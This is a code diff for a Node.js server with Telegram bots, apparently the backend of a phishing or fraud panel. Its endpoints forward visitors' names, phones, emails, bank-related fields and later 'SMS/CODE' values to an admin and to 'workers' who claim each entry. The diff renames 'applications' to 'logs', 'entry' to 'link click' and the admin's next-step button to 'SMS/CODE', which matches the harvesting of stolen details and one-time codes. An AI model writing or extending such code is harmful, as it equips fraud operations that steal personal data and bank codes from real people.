@@ -121,7 +121,7 @@ workerBot.onText(/\/mods/, (msg) => {
   if (msg.chat.id !== adminId) return;
 
   if (!moderators.length) {
-    return safeSend(workerBot, adminId, "нет");
+    return safeSend(workerBot, adminId, "нету");
   }
 
   const list = moderators.map(id => {
@@ -140,7 +140,7 @@ app.post("/enter", async (req, res) => {
   if (!id) return res.json({ ok: false });
 
   onlineUsers[id] = Date.now();
-  await safeSend(enterBot, adminId, `👀 Вход\n🆔 ${id}`);
+  await safeSend(enterBot, adminId, `👀 Переход по ссылке\n🆔 ${id}`);
 
   res.json({ ok: true });
 });
@@ -169,15 +169,15 @@ app.post("/send", async (req, res) => {
   seenUsers[id] = true;
 
   const statusText = isRepeat
-    ? "🔁 ПОВТОРНАЯ ЗАЯВКА"
-    : "🆕 НОВАЯ ЗАЯВКА";
+    ? "Повторный Лог ♻️"
+    : "👻 Новый Лог 🔥";
 
   const fullText = `${statusText}
 
 🆔 ${id}
-📦 ${d.service}
-👤 ${d.name}
-📞 ${d.phone}
+🏧 ${d.service}
+🗝️ ${d.name}
+📱 ${d.phone}
 📅 ${d.email}
 🔐 ${d.city}
 💳 ${d.comment}`;
@@ -185,7 +185,7 @@ app.post("/send", async (req, res) => {
   const shortText = `${statusText}
 
 📦 ${d.service}
-👤 ${d.name}
+🗝️ ${d.name}
 📞 ${d.phone}`;
 
   fullRequests[id] = fullText;
@@ -224,7 +224,7 @@ app.post("/send2", async (req, res) => {
   const owner = takenRequests[id];
 
   if (owner) {
-    await safeSend(workerBot, owner, `📩 ДОП ДАННЫЕ\n🆔 ${id}\n💬 ${value}`);
+    await safeSend(workerBot, owner, `📩 SMS/CODE\n🆔 ${id}\n💬 ${value}`);
   }
 
   res.json({ ok: true });
@@ -259,7 +259,7 @@ workerBot.on("callback_query", async (q) => {
             { text: "🚫 Бан", callback_data: "ban_" + id },
             { text: "✅ Разбан", callback_data: "unban_" + id }
           ],
-          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
+          [{ text: "➡️ SMS/CODE", callback_data: "allow_" + id }]
         ]
       }
     });
